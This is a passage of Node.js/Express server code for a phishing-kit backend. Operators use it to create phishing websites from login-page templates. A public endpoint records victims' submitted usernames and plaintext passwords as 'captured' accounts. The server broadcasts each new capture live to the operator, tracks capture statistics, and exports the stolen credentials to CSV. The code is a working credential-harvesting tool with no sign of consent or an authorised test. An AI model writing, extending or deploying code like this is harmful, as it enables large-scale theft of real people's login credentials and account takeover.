// ============================================================================

// ============================================================================
// PHISHING API ENDPOINTS
// ============================================================================

// Get all websites for user
app.get('/api/phishing/websites', authenticateUser, async (req, res) => {
  try {
    const { page = 1, limit = 10, search = '' } = req.query;
    const offset = (page - 1) * limit;
    const userId = req.user.id;

    let whereClause = 'WHERE user_id = ?';
    let queryParams = [userId];

    if (search && search.trim()) {
      whereClause += ' AND (title LIKE ? OR slug LIKE ?)';
      queryParams.push(`%${search}%`, `%${search}%`);
    }

    const result = await executeQuery(`
      SELECT * FROM websites 
      ${whereClause}
      ORDER BY created_at DESC 
      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
    `, queryParams);

    const countResult = await executeQuery(`
      SELECT COUNT(*) as total FROM websites ${whereClause}
    `, queryParams);

    if (!result.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Database query failed: ' + result.error
      });
    }

    if (!countResult.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Count query failed: ' + countResult.error
      });
    }

    res.json({
      status: 'success',
      data: result.data || [],
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        total: countResult.data?.[0]?.total || 0,
        pages: Math.ceil((countResult.data?.[0]?.total || 0) / limit)
      }
    });
  } catch (error) {
    console.error('Get websites error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch websites'
    });
  }
});

// Create new website (robust version)
app.post('/api/phishing/websites', authenticateUser, strictRateLimiter(), async (req, res) => {
  try {
    console.log('🚀 Creating website - raw body:', req.body);

    const {
      title, description, slug, redirect_url,
      temp1, temp2,
      phishing_template_id, login_template_id,
      thumbnail, language, domain
    } = req.body;

    const userId = req.user.id;
    console.log('👤 User ID:', userId);

    // Validate required fields
    if (!title || !slug) {
      console.log('❌ Missing required fields:', { title: !!title, slug: !!slug });
      return res.status(400).json({
        status: 'error',
        message: 'Title and slug are required'
      });
    }

    // Check if slug already exists
    console.log('🔍 Checking if slug exists:', slug);
    const existingSlug = await executeQuery('SELECT id FROM websites WHERE slug = ?', [slug]);

    if (!existingSlug.success) {
      console.error('❌ Slug check failed:', existingSlug.error);
      return res.status(500).json({
        status: 'error',
        message: 'Database error during slug validation: ' + existingSlug.error
      });
    }

    if (existingSlug.data && existingSlug.data.length > 0) {
      console.log('❌ Slug already exists');
      return res.status(400).json({
        status: 'error',
        message: 'Slug already exists'
      });
    }

    console.log('✅ Slug is available');

    // Prepare data with defaults and safe truncation
    const websiteData = {
      title: (title || '').substring(0, 255),
      description: (description || '').substring(0, 1000),
      slug: slug,
      redirect_url: (redirect_url || '').substring(0, 500),
      temp1: temp1 || '',
      temp2: temp2 || '',
      phishing_template_id: phishing_template_id ? parseInt(phishing_template_id) : null,
      login_template_id: login_template_id ? parseInt(login_template_id) : null,
      thumbnail: thumbnail && thumbnail.length > 100000 ? '' : (thumbnail || ''), // Skip huge base64
      language: (language || 'en').substring(0, 10),
      domain: (domain || '').substring(0, 255),
      user_id: userId
    };

    console.log('💾 Prepared website data (sizes):', {
      title: websiteData.title.length,
      temp1: websiteData.temp1.length,
      temp2: websiteData.temp2.length,
      thumbnail: websiteData.thumbnail.length
    });

    // First check if template ID columns exist
    console.log('🔍 Checking if template ID columns exist...');
    const schemaCheck = await executeQuery('DESCRIBE websites');
    let hasTemplateColumns = false;

    if (schemaCheck.success) {
      const columns = schemaCheck.data.map(col => col.Field);
      hasTemplateColumns = columns.includes('phishing_template_id') && columns.includes('login_template_id');
      console.log('📊 Current columns:', columns.join(', '));
      console.log('🆔 Has template columns:', hasTemplateColumns);
    }

    let insertResult;

    if (hasTemplateColumns) {
      // Try insert with template IDs
      console.log('🔄 Inserting with template IDs...');
      insertResult = await executeQuery(`
        INSERT INTO websites (
          title, description, slug, redirect_url, temp1, temp2, 
          phishing_template_id, login_template_id, 
          thumbnail, language, domain, user_id
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `, [
        websiteData.title, websiteData.description, websiteData.slug,
        websiteData.redirect_url, websiteData.temp1, websiteData.temp2,
        websiteData.phishing_template_id, websiteData.login_template_id,
        websiteData.thumbnail, websiteData.language, websiteData.domain,
        websiteData.user_id
      ]);
    } else {
      // Use fallback schema
      console.log('🔄 Inserting with legacy schema (no template IDs)...');
      insertResult = await executeQuery(`
        INSERT INTO websites (
          title, description, slug, redirect_url, temp1, temp2, 
          thumbnail, language, domain, user_id
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      `, [
        websiteData.title, websiteData.description, websiteData.slug,
        websiteData.redirect_url, websiteData.temp1, websiteData.temp2,
        websiteData.thumbnail, websiteData.language, websiteData.domain,
        websiteData.user_id
      ]);
    }

    console.log('💾 Insert result:', insertResult);

    if (!insertResult.success) {
      console.error('❌ Insert failed:', insertResult.error);
      return res.status(500).json({
        status: 'error',
        message: 'Database insert failed: ' + insertResult.error
      });
    }

    // Success with full schema
    console.log('🎉 Website created successfully with full schema');

    // Log activity
    try {
      const ipAddress = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.ip;
      const userAgent = req.headers['user-agent'] || '';
      await executeQuery(`
        INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
      `, [
        userId,
        req.user.username,
        'website_created',
        'Created Website',
        `Created website "${websiteData.title}" with slug "${websiteData.slug}"`,
        JSON.stringify({ website_id: insertResult.data?.insertId, slug: websiteData.slug, domain: websiteData.domain }),
        ipAddress,
        userAgent
      ]);
    } catch (logError) {
      console.error('Failed to log activity:', logError);
    }

    res.json({
      status: 'success',
      message: 'Website created successfully',
      data: {
        id: insertResult.data?.insertId || Date.now(),
        slug: websiteData.slug,
        title: websiteData.title
      }
    });

  } catch (error) {
    console.error('❌ CRITICAL ERROR in create website:', error);
    console.error('❌ Error stack:', error.stack);
    res.status(500).json({
      status: 'error',
      message: 'Server error occurred',
      debug: error.message
    });
  }
});

// Get website by ID
app.get('/api/phishing/websites/:id', authenticateUser, async (req, res) => {
  try {
    const { id } = req.params;
    const userId = req.user.id;

    const result = await executeQuery(
      'SELECT * FROM websites WHERE id = ? AND user_id = ?',
      [id, userId]
    );

    if (result.data.length > 0) {
      res.json({
        status: 'success',
        data: result.data[0]
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Website not found'
      });
    }
  } catch (error) {
    console.error('Get website error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch website'
    });
  }
});

// Update website
app.put('/api/phishing/websites/:id', authenticateUser, moderateRateLimiter(), async (req, res) => {
  try {
    const { id } = req.params;
    const {
      title, description, slug, redirect_url,
      thumbnail, language, domain
    } = req.body;
    const userId = req.user.id;

    if (!title || !slug) {
      return res.status(400).json({
        status: 'error',
        message: 'Title and slug are required'
      });
    }

    // Check if website exists and belongs to user; fetch current row for comparisons
    const existingWebsite = await executeQuery(
      'SELECT * FROM websites WHERE id = ? AND user_id = ?',
      [id, userId]
    );

    if (existingWebsite.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Website not found'
      });
    }

    // Check if slug already exists (excluding current website)
    const existingSlug = await executeQuery(
      'SELECT id FROM websites WHERE slug = ? AND id != ?',
      [slug, id]
    );

    if (existingSlug.data.length > 0) {
      return res.status(400).json({
        status: 'error',
        message: 'Slug already exists'
      });
    }

    // Ensure required columns exist at runtime (self-healing)
    try {
      const schemaCheck = await executeQuery('DESCRIBE websites');
      if (schemaCheck && schemaCheck.success) {
        const existing = new Map(schemaCheck.data.map(col => [col.Field, col.Type]));
        const requiredColumns = [
          { name: 'phishing_template_id', sql: 'ALTER TABLE websites ADD COLUMN phishing_template_id INT NULL' },
          { name: 'login_template_id', sql: 'ALTER TABLE websites ADD COLUMN login_template_id INT NULL' },
          { name: 'temp1_css', sql: 'ALTER TABLE websites ADD COLUMN temp1_css TEXT NULL' },
          { name: 'temp1_js', sql: 'ALTER TABLE websites ADD COLUMN temp1_js TEXT NULL' },
          { name: 'temp2_css', sql: 'ALTER TABLE websites ADD COLUMN temp2_css TEXT NULL' },
          { name: 'temp2_js', sql: 'ALTER TABLE websites ADD COLUMN temp2_js TEXT NULL' },
          { name: 'view_count', sql: 'ALTER TABLE websites ADD COLUMN view_count INT DEFAULT 0' }
        ];
        for (const col of requiredColumns) {
          if (!existing.has(col.name)) {
            try {
              console.log(`🔧 Runtime add missing column: ${col.name}`);
              await executeQuery(col.sql);
            } catch (e) {
              console.log(`⚠️ Runtime add column failed for ${col.name}:`, e.message || e);
            }
          }
        }

        // Ensure table uses utf8mb4 for full Unicode support (e.g., emojis)
        try {
          console.log('🔧 Ensuring websites table charset is utf8mb4');
          await executeQuery('ALTER TABLE websites CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci');
        } catch (e) {
          console.log('⚠️ Charset conversion skipped/failed:', e.message || e);
        }

        // Upgrade content columns to LONGTEXT if needed to avoid size errors
        const longTextTargets = [
          'temp1', 'temp2', 'temp1_css', 'temp1_js', 'temp2_css', 'temp2_js'
        ];
        for (const name of longTextTargets) {
          if (existing.has(name)) {
            const type = (existing.get(name) || '').toLowerCase();
            if (!type.includes('longtext')) {
              try {
                console.log(`🔧 Upgrading column ${name} type to LONGTEXT (was ${type})`);
                await executeQuery(`ALTER TABLE websites MODIFY COLUMN ${name} LONGTEXT NULL`);
              } catch (e) {
                console.log(`⚠️ Upgrade column type failed for ${name}:`, e.message || e);
              }
            }
          }
        }
      }
    } catch (e) {
      console.log('⚠️ Runtime schema ensure skipped due to error:', e.message || e);
    }

    // Build a dynamic UPDATE using only columns that exist in the DB
    const describe = await executeQuery('DESCRIBE websites');
    const existingCols = describe && describe.success ? new Set(describe.data.map(c => c.Field)) : new Set();

    // Sanitize and auto-truncate values to avoid "Data too long" for VARCHAR columns
    const sanitize = (v) => (v === undefined ? null : (v === null ? null : String(v)));
    const clamp = (v, max) => (v == null ? v : v.slice(0, max));

    const safe_title = clamp(sanitize(title), 255) || '';
    const safe_slug = clamp(sanitize(slug), 255) || '';
    const safe_redirect_url = clamp(sanitize(redirect_url), 500);
    const safe_thumbnail = clamp(sanitize(thumbnail), 500);
    const safe_language = clamp(sanitize(language) || 'en', 10);
    const safe_domain = clamp(sanitize(domain), 255);

    // LONGTEXT/TEXT columns don't need clamping normally
    const safe_description = description === undefined ? null : description;
    // Template-related fields are intentionally ignored per new requirements

    const candidateValues = {
      title: safe_title,
      description: safe_description,
      slug: safe_slug,
      redirect_url: safe_redirect_url,
      thumbnail: safe_thumbnail,
      language: safe_language,
      domain: safe_domain
    };

    const setParts = [];
    const values = [];
    for (const [key, val] of Object.entries(candidateValues)) {
      if (existingCols.has(key)) {
        setParts.push(`${key} = ?`);
        values.push(val);
      }
    }

    if (setParts.length === 0) {
      return res.status(400).json({
        status: 'error',
        message: 'No updatable columns found in current schema'
      });
    }

    const updateSql = `UPDATE websites SET ${setParts.join(', ')} WHERE id = ? AND user_id = ?`;
    values.push(id, userId);

    const result = await executeQuery(updateSql, values);

    // If thumbnail changed, delete old file from server to save space
    try {
      if (result && result.success && existingCols.has('thumbnail')) {
        const oldThumbnail = existingWebsite.data[0]?.thumbnail;
        const newThumbnail = candidateValues.thumbnail;
        if (oldThumbnail && newThumbnail && oldThumbnail !== newThumbnail && oldThumbnail.startsWith('uploads/website/')) {
          const oldPath = path.join(__dirname, oldThumbnail);
          if (fs.existsSync(oldPath)) {
            fs.unlink(oldPath, (e) => {
              if (e) {
                console.log('⚠️ Failed to delete old thumbnail:', e.message || e);
              } else {
                console.log('🧹 Deleted old thumbnail:', oldPath);
              }
            });
          }
        }
      }
    } catch (cleanupErr) {
      console.log('⚠️ Thumbnail cleanup skipped:', cleanupErr.message || cleanupErr);
    }

    if (result.success) {
      res.json({
        status: 'success',
        message: 'Website updated successfully'
      });
    } else {
      console.error('Update website DB error:', result.error);
      res.status(500).json({
        status: 'error',
        message: 'Failed to update website',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Update website error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to update website',
      error: error && (error.message || error)
    });
  }
});

// Frontend-facing: Update website (same logic, clearer errors)
app.put('/api/frontend/phishing/websites/:id', authenticateUser, async (req, res) => {
  try {
    const { id } = req.params;
    const {
      title, description, slug, redirect_url,
      thumbnail, language, domain
    } = req.body;
    const userId = req.user.id;

    if (!title || !slug) {
      return res.status(400).json({
        status: 'error',
        message: 'Title and slug are required'
      });
    }

    const existingWebsite = await executeQuery(
      'SELECT * FROM websites WHERE id = ? AND user_id = ?',
      [id, userId]
    );
    if (!existingWebsite.success) {
      return res.status(500).json({ status: 'error', message: 'DB error fetching website', error: existingWebsite.error });
    }
    if (existingWebsite.data.length === 0) {
      return res.status(404).json({ status: 'error', message: 'Website not found' });
    }

    const existingSlug = await executeQuery(
      'SELECT id FROM websites WHERE slug = ? AND id != ?',
      [slug, id]
    );
    if (!existingSlug.success) {
      return res.status(500).json({ status: 'error', message: 'DB error checking slug', error: existingSlug.error });
    }
    if (existingSlug.data.length > 0) {
      return res.status(400).json({ status: 'error', message: 'Slug already exists' });
    }

    // Describe table to know available columns
    const describe = await executeQuery('DESCRIBE websites');
    if (!describe.success) {
      return res.status(500).json({ status: 'error', message: 'DB error describing table', error: describe.error });
    }
    const existingCols = new Set(describe.data.map(c => c.Field));

    const sanitize = (v) => (v === undefined ? null : (v === null ? null : String(v)));
    const clamp = (v, max) => (v == null ? v : String(v).slice(0, max));

    const candidateValues = {
      title: clamp(sanitize(title), 255) || '',
      description: description === undefined ? null : description,
      slug: clamp(sanitize(slug), 255) || '',
      redirect_url: clamp(sanitize(redirect_url), 500),
      thumbnail: clamp(sanitize(thumbnail), 500),
      language: clamp(sanitize(language) || 'en', 10),
      domain: clamp(sanitize(domain), 255)
    };

    const setParts = [];
    const values = [];
    for (const [key, val] of Object.entries(candidateValues)) {
      if (existingCols.has(key)) {
        setParts.push(`${key} = ?`);
        values.push(val);
      }
    }
    if (setParts.length === 0) {
      return res.status(400).json({ status: 'error', message: 'No updatable columns found in current schema' });
    }

    const updateSql = `UPDATE websites SET ${setParts.join(', ')} WHERE id = ? AND user_id = ?`;
    values.push(id, userId);

    const result = await executeQuery(updateSql, values);
    if (!result.success) {
      return res.status(500).json({ status: 'error', message: 'Failed to update website', error: result.error });
    }

    try {
      if (existingCols.has('thumbnail')) {
        const oldThumbnail = existingWebsite.data[0]?.thumbnail;
        const newThumbnail = candidateValues.thumbnail;
        if (oldThumbnail && newThumbnail && oldThumbnail !== newThumbnail && oldThumbnail.startsWith('uploads/website/')) {
          const oldPath = path.join(__dirname, oldThumbnail);
          if (fs.existsSync(oldPath)) {
            fs.unlink(oldPath, () => { });
          }
        }
      }
    } catch {
      // Ignore file deletion errors
    }

    return res.json({ status: 'success', message: 'Website updated successfully' });
  } catch (error) {
    return res.status(500).json({ status: 'error', message: 'Failed to update website', error: error && (error.message || error) });
  }
});

// Delete website
app.delete('/api/phishing/websites/:id', authenticateUser, moderateRateLimiter(), async (req, res) => {
  try {
    const { id } = req.params;
    const userId = req.user.id;

    const result = await executeQuery(
      'DELETE FROM websites WHERE id = ? AND user_id = ?',
      [id, userId]
    );

    if (result.success && result.data.affectedRows > 0) {
      res.json({
        status: 'success',
        message: 'Website deleted successfully'
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Website not found'
      });
    }
  } catch (error) {
    console.error('Delete website error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to delete website'
    });
  }
});

// Get all accounts for user
app.get('/api/phishing/accounts', authenticateUser, async (req, res) => {
  try {
    const {
      page = 1,
      limit = 10,
      website_id,
      search = '',
      status = '',
      date_from = '',
      date_to = ''
    } = req.query;
    const offset = (page - 1) * limit;
    const userId = req.user.id;

    let whereClause = 'WHERE al.user_id = ?';
    let queryParams = [userId];

    if (website_id) {
      whereClause += ' AND al.website = ?';
      queryParams.push(website_id);
    }

    if (search && search.trim()) {
      whereClause += ' AND (al.username LIKE ? OR al.email LIKE ?)';
      queryParams.push(`%${search}%`, `%${search}%`);
    }

    if (status) {
      whereClause += ' AND al.status = ?';
      queryParams.push(status);
    }

    if (date_from) {
      whereClause += ' AND DATE(al.created_at) >= ?';
      queryParams.push(date_from);
    }

    if (date_to) {
      whereClause += ' AND DATE(al.created_at) <= ?';
      queryParams.push(date_to);
    }

    const result = await executeQuery(`
      SELECT al.*, w.title as website_title 
      FROM account_list al
      LEFT JOIN websites w ON al.website = w.id
      ${whereClause}
      ORDER BY al.created_at DESC 
      LIMIT ? OFFSET ?
    `, [...queryParams, Number(limit) || 10, Number(offset) || 0]);

    const countResult = await executeQuery(`
      SELECT COUNT(*) as total FROM account_list al ${whereClause}
    `, queryParams);

    res.json({
      status: 'success',
      data: result.data,
      pagination: {
        page: parseInt(page),
        limit: parseInt(limit),
        total: countResult.data[0].total,
        pages: Math.ceil(countResult.data[0].total / limit)
      }
    });
  } catch (error) {
    console.error('Get accounts error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch accounts'
    });
  }
});

// Create new account (for phishing form submission)
app.post('/api/phishing/accounts', async (req, res) => {
  try {
    const { username, password, website_slug, ip_address } = req.body;

    if (!username || !password || !website_slug) {
      return res.status(400).json({
        status: 'error',
        message: 'Username, password, and website slug are required'
      });
    }

    // Get website by slug
    const websiteResult = await executeQuery(
      'SELECT id, user_id FROM websites WHERE slug = ?',
      [website_slug]
    );

    if (websiteResult.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Website not found'
      });
    }

    const website = websiteResult.data[0];

    // Insert account
    const result = await executeQuery(`
      INSERT INTO account_list (username, password, website, user_id, ip_address, status)
      VALUES (?, ?, ?, ?, ?, 'success')
    `, [username, password, website.id, website.user_id, ip_address]);

    if (result.success) {
      // Update website view count
      await executeQuery(
        'UPDATE websites SET view_count = view_count + 1 WHERE id = ?',
        [website.id]
      );

      // Get the created account with website info for WebSocket broadcast
      const accountResult = await executeQuery(`
        SELECT al.*, w.title as website_title, w.slug as website_slug
        FROM account_list al
        LEFT JOIN websites w ON al.website = w.id
        WHERE al.id = ?
      `, [result.data.insertId]);

      // Broadcast to user-specific Pusher channel
      if (accountResult.data.length > 0) {
        const userChannel = `phishing-dashboard-user-${website.user_id}`;
        pusher.trigger(userChannel, 'new_account', {
          type: 'new_account',
          data: {
            account: accountResult.data[0],
            timestamp: new Date().toISOString()
          }
        });
        console.log(`📡 Sent new_account event to ${userChannel}:`, accountResult.data[0].username);

        // Log activity
        try {
          await executeQuery(`
            INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
          `, [
            website.user_id,
            req.user?.username || 'System',
            'account_captured',
            'Account Captured',
            `New account captured on website "${accountResult.data[0].website_title}"`,
            JSON.stringify({ website_id: website.id, website_slug: website_slug, account_id: result.data.insertId }),
            ip_address,
            req.headers['user-agent'] || ''
          ]);
        } catch (logError) {
          console.error('Failed to log activity:', logError);
        }
      }

      res.json({
        status: 'success',
        message: 'Account captured successfully',
        data: accountResult.data[0]
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to capture account'
      });
    }
  } catch (error) {
    console.error('Create account error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to capture account'
    });
  }
});

// Get accounts statistics
app.get('/api/phishing/accounts/stats', authenticateUser, async (req, res) => {
  try {
    const userId = req.user.id;

    // Get total accounts
    const totalResult = await executeQuery(
      'SELECT COUNT(*) as total FROM account_list WHERE user_id = ?',
      [userId]
    );

    // Get today's accounts
    const todayResult = await executeQuery(
      'SELECT COUNT(*) as today FROM account_list WHERE user_id = ? AND DATE(created_at) = CURDATE()',
      [userId]
    );

    // Get unique websites
    const websitesResult = await executeQuery(
      'SELECT COUNT(DISTINCT website) as unique_websites FROM account_list WHERE user_id = ?',
      [userId]
    );

    // Get success rate (success status vs total)
    const successResult = await executeQuery(
      'SELECT COUNT(*) as success FROM account_list WHERE user_id = ? AND status = "success"',
      [userId]
    );

    const total = totalResult.data[0].total || 0;
    const success = successResult.data[0].success || 0;
    const successRate = total > 0 ? Math.round((success / total) * 100) : 0;

    res.json({
      status: 'success',
      data: {
        totalAccounts: total,
        todayAccounts: todayResult.data[0].today || 0,
        uniqueWebsites: websitesResult.data[0].unique_websites || 0,
        successRate: successRate
      }
    });
  } catch (error) {
    console.error('Get accounts stats error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch accounts statistics'
    });
  }
});

// Delete account
app.delete('/api/phishing/accounts/:id', authenticateUser, async (req, res) => {
  try {
    const { id } = req.params;
    const userId = req.user.id;

    // First check if account belongs to user
    const checkResult = await executeQuery(
      'SELECT id FROM account_list WHERE id = ? AND user_id = ?',
      [id, userId]
    );

    if (checkResult.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Account not found or access denied'
      });
    }

    // Delete the account
    const deleteResult = await executeQuery(
      'DELETE FROM account_list WHERE id = ? AND user_id = ?',
      [id, userId]
    );

    if (deleteResult.success) {
      res.json({
        status: 'success',
        message: 'Account deleted successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to delete account'
      });
    }
  } catch (error) {
    console.error('Delete account error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to delete account'
    });
  }
});

// Export accounts to CSV
app.get('/api/phishing/accounts/export', authenticateUser, async (req, res) => {
  try {
    const {
      website_id,
      search = '',
      status = '',
      date_from = '',
      date_to = ''
    } = req.query;
    const userId = req.user.id;

    let whereClause = 'WHERE al.user_id = ?';
    let queryParams = [userId];

    if (website_id) {
      whereClause += ' AND al.website = ?';
      queryParams.push(website_id);
    }

    if (search && search.trim()) {
      whereClause += ' AND (al.username LIKE ? OR al.email LIKE ?)';
      queryParams.push(`%${search}%`, `%${search}%`);
    }

    if (status) {
      whereClause += ' AND al.status = ?';
      queryParams.push(status);
    }

    if (date_from) {
      whereClause += ' AND DATE(al.created_at) >= ?';
      queryParams.push(date_from);
    }

    if (date_to) {
      whereClause += ' AND DATE(al.created_at) <= ?';
      queryParams.push(date_to);
    }

    const result = await executeQuery(`
      SELECT 
        al.id,
        al.username,
        al.password,
        al.email,
        al.ip_address,
        al.status,
        al.code,
        al.created_at,
        w.title as website_title
      FROM account_list al
      LEFT JOIN websites w ON al.website = w.id
      ${whereClause}
      ORDER BY al.created_at DESC
    `, queryParams);

    if (!result.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to fetch accounts for export'
      });
    }

    // Create CSV content
    const csvHeader = 'ID,Username,Password,Email,Website,IP Address,Status,Code,Created At\n';
    const csvRows = result.data.map(account => {
      return [
        account.id,
        account.username || '',
        account.password || '',
        account.email || '',
        account.website_title || '',
        account.ip_address || '',
        account.status || '',
        account.code || '',
        new Date(account.created_at).toLocaleString()
      ].map(field => `"${String(field).replace(/"/g, '""')}"`).join(',');
    }).join('\n');

    const csvContent = csvHeader + csvRows;

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=accounts_export_${new Date().toISOString().split('T')[0]}.csv`);
    res.send(csvContent);
  } catch (error) {
    console.error('Export accounts error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to export accounts'
    });
  }
});

// Clone template with fields (for "Use Template" functionality)
app.post('/api/templates/clone/:id', authenticateUser, async (req, res) => {
  try {
    const { id } = req.params;
    const userId = req.user.id;
    const { name } = req.body;

    // Get the source template
    const sourceTemplate = await executeQuery(
      'SELECT * FROM templates WHERE id = ? AND (is_shared = 1 OR created_by = ?)',
      [id, userId]
    );

    if (!sourceTemplate.success || sourceTemplate.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'Template not found or access denied'
      });
    }

    const template = sourceTemplate.data[0];

    // Create new template with cloned content
    const newTemplateName = name || `${template.name} (Copy)`;
    const cloneResult = await executeQuery(`
      INSERT INTO templates (
        name, description, thumbnail, type, content_html, content_css, content_js, 
        is_active, is_shared, approval_status, created_by
      )
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `, [
      newTemplateName,
      template.description,
      template.thumbnail,
      template.type,
      template.content_html,
      template.content_css,
      template.content_js,
      true,
      false, // Private by default
      'approved', // Auto-approved for user's own templates
      userId
    ]);

    if (!cloneResult.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to clone template'
      });
    }

    const newTemplateId = cloneResult.data.insertId;

    // Copy template fields if they exist
    const fieldsResult = await executeQuery(
      'SELECT * FROM template_fields WHERE template_id = ?',
      [id]
    );

    if (fieldsResult.success && fieldsResult.data.length > 0) {
      // Insert each field for the new template
      for (const field of fieldsResult.data) {
        await executeQuery(`
          INSERT INTO template_fields (
            template_id, field_name, field_type, field_label, field_placeholder,
            max_length, is_required, field_order
          )
          VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        `, [
          newTemplateId,
          field.field_name,
          field.field_type,
          field.field_label,
          field.field_placeholder,
          field.max_length,
          field.is_required,
          field.field_order
        ]);
      }
      console.log(`✅ Copied ${fieldsResult.data.length} fields for template ${newTemplateId}`);
    }

    res.json({
      status: 'success',
      message: 'Template cloned successfully with all fields',
      data: {
        id: newTemplateId,
        name: newTemplateName,
        fieldsCount: fieldsResult.success ? fieldsResult.data.length : 0
      }
    });
  } catch (error) {
    console.error('Clone template error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to clone template'
    });
  }
});


// Get website by slug (public endpoint for phishing pages)
app.get('/api/phishing/website/:slug', async (req, res) => {
  try {
    const { slug } = req.params;

    const result = await executeQuery(
      'SELECT * FROM websites WHERE slug = ?',
      [slug]
    );

    if (result.data.length > 0) {
      const website = result.data[0];

      // If website uses template IDs, fetch template content
      if (website.phishing_template_id || website.login_template_id) {
        const templatePromises = [];

        if (website.phishing_template_id) {
          templatePromises.push(
            executeQuery('SELECT content_html FROM templates WHERE id = ?', [website.phishing_template_id])
          );
        }

        if (website.login_template_id) {
          templatePromises.push(
            executeQuery('SELECT content_html FROM templates WHERE id = ?', [website.login_template_id])
          );
        }

        const templateResults = await Promise.all(templatePromises);

        // Update website object with template content
        if (website.phishing_template_id && templateResults[0]?.data?.length > 0) {
          website.temp1 = templateResults[0].data[0].content_html;
        }

        if (website.login_template_id && templateResults[website.phishing_template_id ? 1 : 0]?.data?.length > 0) {
          website.temp2 = templateResults[website.phishing_template_id ? 1 : 0].data[0].content_html;
        }
      }

      res.json({
        status: 'success',
        data: website
      });
    } else {
      res.status(404).json({
        status: 'error',
        message: 'Website not found'
      });
    }
  } catch (error) {
    console.error('Get website by slug error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch website'
    });
  }
});



// ==============================================
// ADMIN API ENDPOINTS
// ==============================================

// Templates Management
app.get('/api/admin/templates', authenticateUser, async (req, res) => {
  try {
    // Check if user is admin
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const result = await executeQuery(`
      SELECT t.*, u.username as created_by_name
      FROM templates t
      LEFT JOIN users u ON t.created_by = u.id
      ORDER BY t.created_at DESC
    `);

    if (result.success) {
      res.json({
        status: 'success',
        data: result.data
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch templates'
      });
    }
  } catch (error) {
    console.error('Get templates error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch templates'
    });
  }
});

app.post('/api/admin/templates', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { name, description, thumbnail, type, content_html, content_css, content_js, is_active } = req.body;
    const createdBy = req.user.id;

    if (!name) {
      return res.status(400).json({
        status: 'error',
        message: 'Template name is required'
      });
    }

    const result = await executeQuery(`
      INSERT INTO templates (name, description, thumbnail, type, content_html, content_css, content_js, is_active, created_by)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `, [name, description, thumbnail, type, content_html, content_css, content_js, is_active, createdBy]);

    if (result.success) {
      res.json({
        status: 'success',
        message: 'Template created successfully',
        data: { id: result.data.insertId }
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to create template'
      });
    }
  } catch (error) {
    console.error('Create template error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to create template'
    });
  }
});

app.put('/api/admin/templates/:id', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { id } = req.params;
    const { name, description, thumbnail, type, content_html, content_css, content_js, is_active } = req.body;

    if (!name) {
      return res.status(400).json({
        status: 'error',
        message: 'Template name is required'
      });
    }

    const result = await executeQuery(`
      UPDATE templates 
      SET name = ?, description = ?, thumbnail = ?, type = ?, content_html = ?, content_css = ?, content_js = ?, is_active = ?
      WHERE id = ?
    `, [name, description, thumbnail, type, content_html, content_css, content_js, is_active, id]);

    if (result.success) {
      res.json({
        status: 'success',
        message: 'Template updated successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to update template'
      });
    }
  } catch (error) {
    console.error('Update template error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to update template'
    });
  }
});

app.delete('/api/admin/templates/:id', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const { id } = req.params;

    const result = await executeQuery('DELETE FROM templates WHERE id = ?', [id]);

    if (result.success) {
      res.json({
        status: 'success',
        message: 'Template deleted successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to delete template'
      });
    }
  } catch (error) {
    console.error('Delete template error:', error);
    res.status(500).json({
